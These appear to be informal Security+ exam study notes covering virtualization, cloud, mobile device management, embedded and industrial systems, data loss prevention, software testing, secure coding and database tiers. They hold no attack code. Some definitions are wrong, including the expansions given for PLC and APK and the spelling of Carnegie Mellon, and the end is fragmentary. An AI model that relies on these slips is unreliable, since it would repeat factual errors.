Building on VDE, the user’s desktop is running inside a virtual machine that resides on a server in a datacenter.
Datacenter - server - VDI - VDE - clinet
VDI is a form of VDE that enables fully personalized desktops for each user and the benefits that come with centralized management: security, simplicity, and so on.
In total, there are 4 main virtualization types: Server, Desktop, Application, and Presentation.
persistent VDI:
Each user runs their own copy of virtual desktop
At the end of a session, user data and personal settings are saved
  non-persistent VDI:
Virtual desktop is shared among multiple users
At the end of a session, user desktop reverts to its original state
VM Escape
A crash in another customer’s implementation could expose a path by which a user might hop (“server hop”) to your data.
should test extensively to keep it from happening.
Prevent VM Escape: Patch management. Sandboxing:
  - running apps in restricted memory areas to provide escape protection.
  - limit the possibility of an app’s crash, allowing a user to access another
app or the data associated with it.
  - Without sandboxing, the possibility of hopping is increased, but sandboxing greatly diminishes this possibility.
VM Sprawl
VM are like anything else IT-related, they can start small but continue to grow in both size and number at alarming rates.
As they grow, so do the licenses, the users, the maintenance, and the overall administration. This growth is known as sprawl, and it can quickly catch an organization off-guard when the savings they thought they were getting suddenly leave them with a bigger job than they can manage.
Prevent VM sprawl: plan for it as you would anything else.
Usage audit: monitor usage, add resources, and move underutilized VMs from busy machines, you can counter sprawl and keep things running smoothly.
Asset documentation.
On-Premise vs. Hosted vs. Cloud
The servers used for virtualization can be located just about anywhere. on-premise model:
  - locate them within the physical confines of your location
  - The benefit: control physical access to the servers, protect it more than
anyone else.
  - Naturally, you assume the risks and responsibilities associated with security when choosing to use an on-premise model as well as the overhead (electricity, depreciation, and so forth).
hosted model:
  - another provider assumes the responsibility for supplying you with the
virtual access you need.
  - You contract with them for a specific period of time, and during that time they bear responsibility for security, overhead, and so on.
  - They may store the server(s) at a single location or multiple locations, but the agreement you have with them spells out their obligations and you are mostly hands-off.
Cloud
    - similar to hosted
  - NIST defines the cloud model as differing in that it is centered around five different attributes:
  - On-demand self-service. The customer is able to provision new users, services, virtual machines, and so on without involving the provider.
  - Broad network access. Services are accessed via the Internet, instead of through an internal network accessible only over private connections.
  - Resource pooling. Shared resources are made available so that services can draw from them as needed.
  - Rapid elasticity. Needs can expand or contract, and needed service will expand or contract with those needs.
  - Measured service. Billing is based on some measured consumption (which could be licenses, CPU cycles, storage consumed, and so forth)—you pay for what you use.
Cloud Access Security Brokers CASB
While they sound like individuals, cloud access security brokers (CASBs) are actually on-premise or cloud-based security policy enforcement points.
They exist between the cloud service users and providers for the purpose of combining (and adding) enterprise security policies as resources are accessed.
The brokers can consolidate lots of different types of security policy enforcement (single sign-on, authorization, credential mapping, encryption, and so forth) while acting like a gatekeeper.
They essentially allow the organization to extend the reach of their own security policies beyond the confines of their own infrastructure.
Security Broker (CASB)
gives both visibility into your entire cloud stack and the security automation tool your IT team needs. Secure Mobile Devices
organizations need to identify methods
to manage the security related to the devices, to monitor the devices
enforce security policies.
mobile device:
a smartphone or tablet.
have additional characteristics, such as at least one wireless network interface, local data storage, an operating system and the ability to install additional applications.
typically have other optional features, other networking options (Bluetooth, near field communication, cellular access for voice communications), and Global Positioning System (GPS) services.
typically include: camera, video recorder, microphone, the ability to transfer data to another system (traditional computer, other mobile devices.)
basic cell phones and digital cameras are not included in this definition
hey cannot access networks
aren’t susceptible to the same risks associated with smartphones and tablets.
Deployment Models
Any device connected to an organization’s network represents a potential risk. To limit this risk, organizations take steps to monitor and manage mobile devices. If the organization owns, it’s a simple matter to monitor and manage them. However, if employees own these devices, more challenging.
The following list identifies some common deployment models for mobile devices.: Corporate-owned:
  - traditional deployment model
  - the organization purchases devices and issues them to employees. COPE (corporate-owned, personally enabled)
  - similar to the traditional corporate-owned model
  - primary difference: employees are free to use the device personally in
addition to connecting them to the organization’s network.
  - Because the organization owns the devices, it makes it easier to manage them.
BYOD(bring your own device):
  - allow employees to bring their own mobile devices to work and attach them to the network.
  - Employees are responsible for selecting and supporting the device and they typically must comply with a BYOD policy when connecting their device to the network.
  - IT professionals. bring your own disaster
  - IT department responsible for support, monitor, manage device owned
by employees.
CYOD (choose your own device).
  - organizations create a list of acceptable devices along with a CYOD policy.
  - Employees can purchase devices on the list and bring them to work.
  - This gives the IT department a specific list of devices that they need to support, monitor, and manage.
VDI (virtual desktop infrastructure):
  - possible to deploy a VDI that users can access with their mobile device.
  - allows users to access any applications installed on their desktop.
  - When the organization hosts a remote access solution such as a virtual private network (VPN), users can access the mobile VDI from anywhere if they have Internet access.
several methods that mobile devices can use to connect to networks and other devices:
Cellular:
  - connect to a cellular network: third generation (3G), long- term- evolution (LTE), fourth generation (4G), 4G LTE network.
  - The type of network you connect with is dependent on your cellular provider.
  - Newer generations, increased speed for digital transfers, improved voice communications.
Wi-Fi:
  - wireless network interface that you can configure to connect to a wireless network.
  - Typical wireless networks require you to enter or select the service set identifier (SSID) and enter the pre-shared key or password to access the network. More secure networks use Enterprise mode with an 802.1x server.
SATCOM:
  - connections to networks using satellite communications.
  - The most common usage: mobile phones > tablets.   - However, you can purchase satellite hot spots. You can connect mobile devices to the hot spot, and the hot spot provides Internet and voice access via a satellite connection.
  - Additionally, some vehicles include satellite communication technologies that can be used for phone calls and sometimes for shared Internet access.
Bluetooth
  - Bluetooth is a wireless protocol commonly used with personal area networks.
  - some technologies use Bluetooth to connect two smartphones, create a peer-to-peer network to exchange file.
NFC (near field communication).
  - most commonly used as a payment gateway, an NFC reader at a retailer.
  - can also create a peer-to-peer network between two devices with NFC
  - Some applications use NFC to enable Bluetooth on the two devices,
send the shared data via Bluetooth, and then disable Bluetooth.
ANT and ANT+:
  - proprietary wireless protocols used by some mobile devices
  - Many sports and fitness sensors (such as Fitbit) collect data on users (heart rate, steps...) and use ANT to send the data to a mobile device application.
Infrared:
  - a line-of-sight wireless technology used by some mobile devices.
  - the same technology used by most remote controls for TVs and other
audiovisual equipment.
  - Many people add apps to their smartphones and use them as a universal remote for their equipment.   - It’s also possible to transfer files between smartphones using infrared (both smartphones support infrared).
USB (Universal Serial Bus):
  - Mobile devices can typically be connected to a desktop PC or laptop via a USB cable. Most Apple devices have a Lightning port and can connect to PCs via a Lightning to USB cable. Many Android devices have a mini-USB cable and can connect to PCs via a mini-USB to standard USB cable.
Mobile Device Management
includes the technologies to manage mobile devices.
goal is to ensure these devices have security controls in place to keep them secure.
System management tools
Microsoft System Center Configuration Manager (SCCM, ConfigMgr),
  - ensure systems are kept up to date with current patches, have antivirus software installed with up-to-date definitions, and are secured using standard security practices.
  - these tools originally focused on desktop PCs and laptops
  - have expanded to include many mobile devices.
  - Example
  - ConfigMgr includes support for many mobile devices (iOS and Android)
MDM applications help administrators manage mobile devices. MDM concepts that apply to mobile devices: Application management.
  - MDM tools can restrict what applications can run on mobile devices.
  - often use application whitelists, prevent unapproved applications. Full device encryption.
  - Encryption protects against loss of confidentiality on multiple platforms (workstations, servers, mobile devices...) and data transmissions
  - Encryption: provide device / application / data security.
  - corporate-owned devices: can use full device encryption
  - employees use their own devices: isn’t always possible
Storage segmentation
  - to isolate data
  - Example:
  - create separate segments within the device.
  - store corporate data within an encrypted segment
  - personal data elsewhere on thedevice.
Content management
  - For segmented storage spaces, it’s important to ensure that appropriate content is stored there.
  - MDM system:
  - ensure that all content retrieved from an organization source (such as a
server) is stored in an encrypted segment.
  - can force the user to authenticate again when accessing encrypted segment.
Containerization   - running app in a container, isolates and protects the app and data.
  - useful when employees use their own devices: to encrypt the container
to protect it without encrypting the entire device.
Passwords and PINs.
  - MDM systems typically support password policies, similar to the password policies used in desktop systems. The only limitation is that some mobile devices only support PINs, while others support either passwords or PINs.
Biometrics: Many mobile devices now support biometrics for authentication. Screen locks: automatically locks the device after a period of time. often
combined with erase function.
Remote wipe: sends a remote signal to the device to wipe / erase all the data.
  - This also deletes any cached data, and provides a complete sanitization of the device by removing all valuable data.
Geolocation:
  - use Global Positioning System (GPS) to identify the location of the
device.
Geofencing: create a virtual fence or geographic boundary
  - Apps can respond when the device is within the virtual fence. GPS tagging: adds geographical info to files. they can exploit this data. Context-aware authentication:
  - uses multiple elements to authenticate a user and a mobile device.
  - It can include the user’s identity, geolocation, verification that the device
is within a geofence, time of day, and type of device.
  - help prevent unauthorized users and device from accessing apps or data.
Push notification services:   - send messages to mobile devices from apps.
  - even if the device is in screen lock mode and even if the app is not
running.
  - Example: send notifications to remind users of security settings, or to let them know if their device is complying with securitypolicy requirements.
Mobile Device Enforcement and
Monitoring
MDM: manage devices differently depending on who owns them.
- organization owns: MDM tool typically download and install all required app, ensure up to date.
- employee-owned: monitor them for compliance, block access to the network if the device doesn’t meet minimum requirements.
  - Example
  - device isn’t patched or doesn’t have up-to-date antivirus software,
  - the MDM software works with network access control (NAC) technologies to prevent the device from connecting to the network.
many common issues that an MDM can monitor and/or enforce:
Unauthorized Software
Organizations: want users only install apps obtained from approved sources.
- iPhone and iPad devices: Apple’s App Store.
- Android devices: Google Play site
A third-party app store: don’t undergo the same level of scrutiny and represent a higher risk. - Jailbreaking: removing all software restrictions from an Apple device. After jailbreaking a device, users can install software from any third- party source.
- Rooting: modify Android device to give the root-level (full administrator) access to the device.
- Both introduce risks and vulnerabilities to the device,
- common for an MDM to block all access to a network if it detects a device has either been rooted or jailbroken.
Mobile devices typically have the operating system stored in onboard memory such as flash memory, which retains data even without power. Because the operating system is the software and the memory is hardware, this is commonly called firmware.
- Updates to the operating system: overwrite the firmware using over-the-air (OTA) techniques. Firmware OTA updates keep the device up to date.
custom firmware:
- as another methodof rooting Android devices.
- complex and fraught with risks. However, some people find downloadable images and copy them onto their devices to overwrite the firmware.
installapp onAndroiddevicesbysideloading them.
- the process of copying an app package in the Application Packet Kit (APK)
format to the device and then activating it.
  - The device must be set to allow apps from Unknown Sources, weaken
security.
- Sideloading is useful for developers testing apps, but considered risky when installing apps from third parties. Short Message Service (SMS) and Multimedia Messaging Service (MMS).
- SMS is a basic text messaging service supported on many telephone and
mobile devices.
- MMS: extension of SMS, allows users to include multimedia content (picture, a short video, audio, slideshow of multiple images...)
There are two primary risks with text messaging.
First, both send text in plaintext. (many apps such as iMessage offer encryption capabilities.)
The second risk: MMS can send media.
Attackers have discovered ways to send an MMS message to a phone number and gain remote code execution privileges on the user’s phone. example, security researchers identified a vulnerability in Stagefright, a media library within the Android operating system that is susceptible to attacks. In 2015, experts indicated that 95 percent of Android devices were vulnerable. At this point, the vulnerability is patched on most devices.
credit card data and be used for payments.
example, NFC, used as a payment gateway with some mobile devices. When issuing phones to users, organizations need to consider if they want to put their own payment methods on the phone for some payments. If so, this typically needs to be monitored closely.
Hardware Control
- MDM tools: help control the use of the hardware on mobile devices
- Mobile include a camera and a recording microphone. present significant risks.   - Example
  - Attackers inserted malicious code into some app available on some
third-party sites.
  - users install the apps,
  - it allows an attacker to remotely connect to the phone, snap pictures, record audio, and much more...
- configure the MDM software to disable the camera and recording microphone.
  - Ideally, the MDM tool will only disable the camera and microphone when the device is in a previously configured geofence.
  - Unfortunately, all MDM tools don’t support disabling hardware based on geolocation.
  - If the MDM tool doesn’t support this feature, the organization may prohibit the possession of smartphones in certain areas.
- prevent the use of external media and Universal Serial Bus On-The-Go (USB OTG) cables.
  - Mobile devices commonly have one or more ports where you can plug in a cable.
  - Apple: Lightning port
  - Android: micro-USB or mini-USB.
  - connect external media (external drive) to the device. presents additional risks. It could contain malware. It might also allow a malicious insider to copy a massive amount of data.
  - USB OTG cables allow you to connect just about any device to your mobile device, including another mobile device.
  - This includes a mouse, keyboard, Musical Instrument Digital Interface (MIDI) keyboard, and external media. using MDM tools.
Unauthorized Connections
- Management ensure that the mobile device cannot access the Internet using another connection.
- other connections that can be modified and blocked with an MDM tool. Most smartphones support tethering:
- share one device’s Internet connection with other devices that has a wireless connection.
- employees use tethering within the organization, bypass security like firewalls and proxy servers.
- Example:
- not safe for work (NSFW) site with work laptop: The proxy server blocks access.
- tether laptop to smartphone and visit the site.
- This direct connection will bypass any content filters in the network, allow malware onto his laptop.
Many mobile devices also support Wi-Fi Direct
- a standard that allows devices to connect without a wireless access point, or
wireless router.
- similar to a wireless ad hoc network, allows devices to connect together without a wireless access point or wireless router.
- The difference is that Wi-Fi Direct uses single radio hop communication.   - none of the devices in a Wi-Fi Direct network can share an Internet connection.
  - However, systems in a wireless ad hoc network use multihop wireless communications and can share an Internet connection.
locked into a specific carrier:
- subscriber identification module (SIM) card identifies what countries /
networks the phone use.
- unlock phone (arrier unlocking) and use it with another carrier.
- An organization might want to block this capability for all COPE devices.
Embedded Systems Security embedded system:
a computer system with a dedicated function within a larger mechanical or electrical system.
any device that has a dedicated function and uses a computer system to perform that function.
  - can be chips within Internet of Things (IoT) devices or controllers in manufacturing equipment.
  - Each device can use a different CPU, OS, and app depending on its function.
the same security questions must be asked:
Does the device have robust authentication?
Is the data encrypted, both at rest and in transit? Has the device’s software/firmware been patched? All issues address in your network are now extended to other devices. more devices in the coming years.
Internet of Things (IoT): a growing issue. At first, this encompassed primarily automated industrial devices. However, it has even spread to private homes.
Wearable technology: sensitive personal information is stored on the device.
  - Example: Fitbit, microchips in pets, njected in hand at the tattoo parlor,
program it to open smart locks or control cell phone.
  - In some cases, the device synchronizes with a computer.
  - The data stored / in transit on the device should be encrypted
  - TLS is an excellent solution for encrypting in transit.
smart home technology / Home automation:
  - smart technology in heating, ventilation, and air conditioning (HVAC).
  - These devices connect to the home’s network, which gives them Internet access. allows people to access or control these devices from the Internet.
Printers: have presented a security issue for as long as networked printers have existed.
  - Most modern printers of any significant capability have programmed embedded chips.
  - Access the printer remotely: telnet, SSH... Convenient but provide access to an attacker, particularly if these protocols use default settings.
  - MFD: Multifunction device: an all-in-one (AIO) device that incorporates printing, copying, scanning, and faxing. machine, consolidating a printer, copier, scanner and fax machine.
  - MPS: Managed print services
  - MDS: Managed document services Industrial Control System (ICS)
⁃
  - systems within large facilities such as power plants or water treatment facilities.
  - Industrial systems include:
  - SCADA (Supervisor Control and Data Acquisition)
  - An ICS is controlled by SCADA system.
  - fundamental security steps: implement account usage and monitoring. provide details on who is using the system, how, and when.
  - Ideally, these systems are contained within isolated networks, like within a virtual local area network (VLAN), that do not have access to the Internet.
  - If they are connected to the corporate network, they are often protected by a NIPS to block unwanted traffic.
  - and PLCs (primary logic controllers).
  - most effective in securing an ICS infrastructure: Network
isolation
Real-time operating systems (RTOSs):
 A system providing the capability for remote control,
real-time monitoring, and gathering information related to industrial equipment
   - NIPS: the most relevant security control to ensure
availability of the SCADA system.
   - designed to process data as quickly as possible.
  - developed originally for military applications.
  - not just software that operates in real time, but to have zero latency, or as near to that as possible.
  - an operating system that reacts to input within a specific time.
  - If it can’t respond within the specified time
  - doesn’t process the data and typically reports an error.
  - Example:
  - automated assembly line. Each location on the line receives materials from the previous location, adds additional materials, and passes the result to the next location.
  - Each of these locations could include an embedded system with an RTOS to ensure it receives and processes the materials within a specified time. If it doesn’t, it can raise an error or alert and stop the assembly line.
System-on-a-chip (SoC):
  - completely self-contained systems on a single chip.
  - an integrated circuit that includes all the functionality of a computing system within the hardware.
  - It typically includes an app contained within onboard memory, such as read-only memory (ROM), electrically erasable programmable ROM (EEPROM), or flash memory.
  - Many mobile computing devices include an SoC. Medical devices:
  - Barnaby Jack, a famous hacker, was able to hack into an insulin pump and cause the device to dispense all 300 units of the insulin it contained. The device had wireless capability in order to synchronize data with a doctor’s computer.   - some-one could have been actually killed via hacking
  - Encrypted communications and strong authentication are the appropriate
countermeasures for this.
unmanned aerial vehicles (UAVs / drones), manned aircraft are vulnerable.
  - More vehicles have sophisticated computers and even wireless capabilities. This makes these vehicles susceptible to attack. This is not limited to automobiles
   - technical security controls that can be applied to an UAV:
  - Wireless signal encryption
  - Password protection
Security cameras: digital with wireless capabilities, potentially vulnerable to attack. An attacker could breach the device and use it to surveil the victim.
Heating, ventilation, and air conditioning (HVAC) systems
  - keep computing systems at the proper temperature and humidity.
  - The optimal temperature range is between 68 and 71 degrees Fahrenheit.
While these systems aren’t necessarily accessible via the Internet, many autos now include Internet access via satellite communications.
Security automation
security should be an automatic feature of technology. example, you don’t have to manually tell your browser to encrypt traffic. The HTTPS protocol handles that for you.
security must always be integrated into technology.
Continuous integration requires that security be in product design, development, implementation, and maintenance.
Security cannot be added as an afterthought.
Security Implications and Vulnerabilities
The challenge with embedded systems:
keeping them up to datewith security fixes.
  - Exploits are regularly discovered,Whendisconverthem,release patches. apply the patch, the system is no longer vulnerable to the exploit.
  - But vendors of embedded systems are not as aggressive in identifying vulnerabilities and creating patches to fix them.
  - patch management: routine function for IT administrators
  - In contrast, how often does a regular user think about checking
or applying patches to his refrigerator? embedded systems are deployed with default configurations.
  - default username and passwords.
Protecting Data Data is one of the most valuable resources, second only to its people. Confidentiality is primarily protected through encryption and strong access
controls.
- encrypting data:
  - Encryption isn’t as easy to bypass.
  - data-at-rest and data- in-transit
- use other tools to restrict access to data
  - but this isn’t always effective.
  - Example
  - Microsoft New Technology File System (NTFS)
  - set permissions on files to restrict access. configure permissions within access control lists (ACLs).
  - but steals a laptop with NTFS-protected files, it’s a simple matter to access them.
  - simply moves the drive to another system as an extra drive, logs on as the administrator, and takes ownership of the files.
Database Security
Another form of software-based encryption is with databases.
  - Example:
  - many database app: Oracle Database or Microsoft SQL Server can encrypt data held within a database.
possible to encrypt the entire database, but more common to encrypt specific data elements.
  - Example   - database includes a table named Customers.
  - Each record within the table has multiple columns, including customer
number, last name, first name, credit card number, and security code.
  - Instead of encrypting the entire table, administrators can choose to encrypt only the credit card number and security code fields within each record.
  - protects the sensitive data, doesn’t waste processing power to encrypt unsensitive data
File System Security
Many operating systems support file- and folder-level encryption.
- Linux: support GNU Privacy Guard (GnuPG or GPG)
  - a command- line tool: encrypt / decrypt files with a password. - Microsoft: NTFS includes the Encrypting File System (EFS),
benefit of file-and folder-level encryption:
- encrypt individual files without encrypting an entire disk.
Permission Issues and Access Violations
A common security issue with permissions is giving users more permissions than they need.
- The principle of least privilege is a core security principle
- users have more permissions than they need, they can accidentally, or
maliciously, cause problems.
- An access violation occurs if users access materials that they shouldn’t. Linux Permissions
three primary entities can assign permissions to within Linux. They are: Owner:
  - user who owns the file / directory
  - owner is typically granted all permissions for the file / directory. Group:
  - The file can also be owned by a named group. Members of this group are granted specific permissions for the file or directory. These permissions are typically less than the permissions applied to the owner.
Others: everyone else. Permissions applied here do not override the Owner or Group permissions.
basic Linux permissions:
Read (r): view the file, 4.
Write (w): modify the file, 2.
Execute (x): run the file, 1.
If a permission is not assigned, represented as a dash.
It’s also possible to assign multiple permissions: 5 indicates Read (4) + Execute (1)
6 indicates Read (4) + Write (2)
7 indicates Read (4) + Write (2) + Execute (1)
Linux permission types displayed in a file access control list (FACL).   chmod command (change mode): to change permissions for files. want to change the permissions to 755 (rwx r-x r-x).
chmod 755 success.exe
Windows Permissions
Windows file and folder permissions are assigned by just pointing and clicking.
right-click the file within File Explorer, select the Security tab, and modify the permissions. The following list shows the basic Windows permissions:
Read: can view the contents of a file or folder.
Read & Execute: Read permission and they can also run or execute programs.
Write. Users can create new files and folders, and they can also make changes to existing files and folders. This would typically be assigned with Read permission.
Modify: can read, execute, write, and delete files and folders. Data Loss Prevention to prevent data loss.
block the use of USB flash drives, control the use of removable media. examine outgoing data
detect many types of unauthorized data transfers.
Removable Media
any storage system that you can attach to a computer and easily copy data.
It’s common for an organization to include security policy statements to prohibit the use of USB flash drives and other removable media. Some technical policies block use of USB drives completely.
DLP solution: more selective, prevent a user from copying or printing files with specific content.
Example:
configure a DLP solution to prevent users from copying or printing any classified documents marked with a label of Confidential.
The DLP software scans all documents sent to the printer, and if it contains the label,
the DLP software:
  - blocks it from reaching the printer.
  - typically log these events.
  - alert security administrators of the event.
Data Exfiltration 溜出敌军阵地 unauthorized transfer of data outside an organization. content filters used in unified threat management (UTM) devices: monitor incoming data streams, looking for malicious code.
network-based DLP: monitors outgoing data looking for sensitive data, specified by an administrator.
DLP systems
can scan the text of all emails and the content of any attached files, including documents, spreadsheets, presentations, and databases.
Even if a user compresses a file as a zipped file before sending it, the DLP examines by unzippingit.
Example
scans all outgoing emails looking for Personally Identifiable Information (PII), such as Social Security numbers.
The network-based DLP includes a mask to identify Social Security numbers as a string of numbers in the following format: ###- ##-####.
If an email or an attachment includes this string of numbers, the DLP detects it, blocks the email, and sends an alert to a security administrator.
Network-based DLP systems: scanning email.
  - include search terms in the DLP application
scan the content of other traffic, such as FTP and HTTP traffic.
Sophisticated data exfiltration attacks: encrypt data before sending it out, difficult for a DLP system to inspect the data. ▪


## However, a DLP system can typically be configured to look for outgoing encrypted data and alert security administrators when it is detected.
Cloud-Based DLP
allow organization to implement policies for data stored in the cloud.
Example:
implement policies to detect Personally Identifiable Information (PII) or Protected Health Information (PHI) stored in the cloud.
After detecting the data, a DLP policy can be configured to take one or more actions such as sending an alert to a security administrator, blocking any attempts to save the data in the cloud, and quarantining the data.
Programming Models
waterfall method:
requirements gathering, design, implementation (also called coding), testing
(also called verification), deployment, and maintenance.
Each stage is completely self-contained.
Once one stage is completed, then you move on to the next stage. appropriate for where the requirements are clearly defined well in advance. strict adherence to a well-documented sequence of steps.
     ▪


## Agile 灵巧的 development:
works in cycles, with each cycle producing specific deliverables.
  - design and development get repeated.
Agile programming is a type of prototyping.
All such methods use a general approach such as:
  - prototype code ➢test ➢ deploy ➢gather feedback.
This process is repeated, each time getting closer to the final goal.
     ▪


## There are many Agile methods, including these:
Agile Modeling
Scrum
Adaptive Software Development
Crystal
Feature-Driven Development
Dynamic Systems Development Method
Lean Software Development XP (Extreme Programming)
Software Testing
dynamic testing   - Fuzzing:
  - simulates incorrect input.
  - providing unexpected values as input to an application in order to
make it crash.
  - purposefully testing with unexpected values to find security vulnerabilities.
  - Those values can be random, invalid, or just unexpected.
  - A common method is to flood the input with a stream of random
bits.
static testing techniques
  - Static code analyzers
  - are tools that simply read through the source code trying to
     ▪


## document vulnerabilities.
  - This can include inadequate error handling, missing memory deallocation, or other problems.
Stress testing:
  - simulates some extraordinary conditions;
  - subjecting the target system to a workload far in excess of what it would
normally encounter.
  - This can uncover defects in the software, including security vulnerabilities.
  - example, if you expect 1,000 visitors a day to your website, simulate 10,000 or even 100,000 a day to test how the system responds to this stress.
Specific Types of Testing
five forms of testing that must be done during the software development life cycle:
Unit Testing
  - When a functioning unit is complete, whether it is a module, programming class, or complete application, it should be tested.
  - This is usually done by the programmer(s).
  - The testing can be either dynamic, static, or both.
Integration Testing
  - When two or more units are connected, they should be tested to ensure that they function together.
  - This is usually done by the programmer(s).
  - This testing is usually dynamic testing.
   ▪


##  System Testing
  - When you have a complete functioning system, it should be tested.
  - This is often done by a separate testing team.
  - This testing is usually dynamic testing.
User Acceptance Testing
  - This is often called beta testing.
  - A test group of users is given access to the system to test it.
  - They are usually testing to see if the system meets their needs.
Regression 衰退 Testing
  - Once a system is deployed, whenever a change is made:
  - not only must the change be tested, but all of the systems that might be affected by that change should also be tested.
Secure Coding Standards
Secure coding can best prevent many of the attacks discussed in this chapter. Cross-site scripting and SQL injection are discussed in detail in this chapter, and proper/secure cod- ing is the only prevention for these attacks. Buffer overflows are examined elsewhere in this book, but again, secure coding is the only real defense against this attack.
General Secure Coding Guidelines
Before examining some secure coding standards, it is important to consider a few simple security measures that are applicable to all programming.
The first is encryption. For all data in transit, you should at least consider encrypting that data; this is particularly true for web applications. In Chapter 8, we will look at SSL/ TLS as the primary means of encrypting data.
For all code that will be installed on third-party machines, code signing is recommended. By digitally signing code, such as ActiveX components in web pages or
 ▪


## device drivers, the end user who is installing the software can be confident as to the software’s origin.
Version control and change management is another concept common to all program- ming. Source code control tools, some of which are open source (such as Subversion and Git), are available that allow you to control versions of software.
It is also important that changes to software be subjected to the same rigorous change management procedures that you might use in any other network change.
This includes a request for changes (RFC) that will be evaluated by a change approval board (CAB).
It will also be important to determine the type of program with which you are work- ing. Is it a compiled program, such as C or C++, or is it runtime program, such as Java or .NET? In the case of runtime programs, potential vulnerabilities exist in the runtime envi- ronment. For example, when using Java, you need to check the version of the Java virtual machine (JVM) you are using to ensure that it does not have any vulnerabilities.
Secure Coding Standards
Secure coding is a broad area, but for the Security+ exam you only need to know the general concepts. If you are a programmer or if you supervise application security, we recommend that you delve deeper into this topic through the URLs that are provided in this section.
OWASP
The Open Web Application Security Project (OWASP)
a voluntary group dedicated to forming secure coding practices for web-based
applications, mobile and client applications, and backend design issues.
The focus on web-based applications is important since they are among the most vulnerable to attack. This organization offers a range of coding standards. The
most fundamental (and the most critical for the Security+ exam) is input validation.
As you will see later in this chapter, some attacks, such as SQL injection, depend entirely on unfiltered input being sent through a web application. OWASP recommends that all data input by a user be validated before it is processed. As
   mentioned earlier, there are two pri- mary ways to do input validation: client-side validation and server-side validation.
Client-side validation usually works by taking the input that a user enters into a text field and, on the client side, checking for invalid characters or input. This process can be as simple as verifying that the input does not exceed the required length, or it can be a com- plete check for SQL injection characters. In either case, the validation is accomplished on the client web page before any data is sent to the server.
Server-side validation involves validating data after the server has received it. This process can include checking business logic to see if the data sent conforms to expected parameters. It is unusual to have just server-side validation. You may have systems with only client-side validation, but server-side validation is normally done in conjunction with client-side validation.
CERT Secure Coding Standards
The Computer Emergency Response Team (CERT) at Carnage Mellon University (www.cert.org/secure-coding/) also details standards for secure coding. CERT standards cover many of the same issues as OWASP, but they also have complete language- specific standards for Java, Perl, C, and C++.
One item that CERT addresses is the issue of exception handling. The fact is that pro- grams encounter errors. How those errors are handled is critical to security. For example, some programmers present detailed error information to the end user. Not only is this not very helpful for most end users, it might actually provide information useful to a hacker. A better idea is to have a simple but helpful message displayed to the end user and just to log the detailed information.
Application Configuration Baselining
Baselining always involves comparing performance to a metric. That metric is a historical measurement that you can point to and identify as coming before a configuration change, before the site became busy, before you added new services, and so on. Baselining can be done with any metric, such as network performance or CPU usage, as well as with applications.
It is advisable to do baselining with key applications prior to major configuration changes. Make certain that applications have proper settings to work at their optimal val- ues and to provide security protection as well. ▪


## Operating System Patch Management
3 types of operating system patches, each with a different level of urgency:
Hotfix
  - an immediate and urgent patch.
  - represent serious security issues and are not optional; they must be
applied to the system.
Patch
  - provides some additional functionality or a non-urgent fix. These are sometimes optional.
Service Pack
  - a cumulative assortment of the hotfixes and patches to date.
  - These should always be applied but tested first to be sure that no
problems are caused by the update.
Application Patch Management
Just as you need to keep operating system patches current, since they often fix security problems discovered within the OS, you need to do the same with application patches. Once an exploit in an application becomes known, an attacker can take advantage of it to enter or harm a system. Most vendors post patches on a regular basis, and you should rou- tinely scan for any available ones.
A large number of attacks today are targeted at client systems for the simple reason that clients do not always manage application patching well. When you couple that with the fact that most clients have many applications running, the odds of being able to find a weakness to exploit are increased dramatically.
Databases and Technologies
One key reason why computers are installed is for their ability to store, access, and modify data. The primary tool for data management is the database. Databases have become increasingly sophisticated, and their capabilities have grown dramatically over
   the last
10 years. This growth has created opportunities to view data in new ways; it has also created problems for both designers and users of these products.
This section briefly discusses database technologies and some of the common issues associated with vulnerabilities in database systems.
The relational database has become the most common approach to database implementa- tion. This technology allows data to be viewed in dynamic ways based on the user’s or admin- istrator’s needs. The most common language used to speak to databases is Structured Query Language (SQL). SQL allows queries to be configured in real time and passed to database serv- ers. This flexibility causes a major vulnerability when it isn’t implemented securely.
Don’t confuse the acronym SQL with Microsoft’s database product SQL Server. SQL Server implements Structured Query Language, or SQL, as do most other databases.
Other Application Security Issues 223
For example, you might want to get the phone numbers of all of the customers who live in a certain geographic area and have purchased products from your company in the last two years. In a manual system, you would first need to determine which customers live in the area you want to research. You would perform a manual search of customer records, and then you would identify which customers have made purchases. This type of process could be very involved and time-consuming.
In a relational database environment, you could query the database to find all of the records that meet your criteria and then print them. The command to do this might be a single line of code, or it might require thousands of instructions. Obviously, the increase in productivity is a worthwhile investment.
Corporate or organizational data is one of an organization’s most valuable assets. It usu- ally resides either in desktop systems or in large centralized database servers. This informa- tion makes the servers tempting targets for industrial espionage and damage.
Database servers suffer from all of the vulnerabilities that we’ve discussed up to this point. Additionally, the database itself is a complex set of programs that work together to provide access to data.
Early database systems connected the end user directly to the data through applications
     ▪


## programs. These programs were intended to allow easy data access and to permit transac- tions to be performed against the database. In a private network, physical security was usu- ally all that was needed to protect the data.
As the Internet has grown, businesses have allowed customers access to such data as tracking orders, reviewing purchases, wiring funds, and virtually any other capabilities they wanted. This increased interoperability has added more coding, more software, and more complexity to databases.
Software manufacturers work hard to keep up with customer demands. Unfortunately, they frequently release software that is prone to security problems. The increase in demand for database-oriented systems and the security problems introduced by software developers and manufacturers have been the biggest areas of vulnerability for database servers.
Databases need patching just like other applications. You should configure them to use access controls and provide their own levels of security.
To improve system performance, as well as to augment the security of databases, compa- nies have implemented the tiered systems model. Three different models are explained here:
One-Tier Model / single-tier environment:
  - the database and the application exist on a single system.
  - This is common on desktop systems running a stand- alone database.
  - Early Unix implementations also worked in this manner;
  - each user would sign on to a terminal and run a dedicated application that accessed the data.
Two-Tier Model:
  - the client workstation or system runs an application that communicates with the database that is running on a different server.
  - This is a common implementation, and it works well for many applications.
Three-Tier Model:
     - effectively isolates the end user from the database by introducing a middle-tier server.
  - This server accepts requests from clients, evaluates them, and then sends them on to the database server for processing.
  - The database server sends the data back to the middle-tier server, which then sends the data to the client system.
  - becoming common in business today.
  - The middle server can also control access to the database and provide
additional security.
These three models provide increased capability and complexity. You must manage each system and keep it current in order for it to provide security.
NoSQL
NoSQL is a relatively new concept. Most commercial relational database management systems (Oracle, Microsoft SQL Server, MySQL, PostGres, and others) use SQL. A NoSQL database is not a relational database and does not use SQL. These databases are less common than relational databases but are often used where scaling is important. Table 7.1 compares NoSQL and SQL databases.
TA b l e 7.1
Feature
Database type Schema type Data storage Benefits
Typical scaling model
Popular vendors/ implementations Susceptible to SQL injection attacks?
Big Data
NoSQL databases vs. SQL databases NoSQL database
Nonrelational/distributed Dynamic
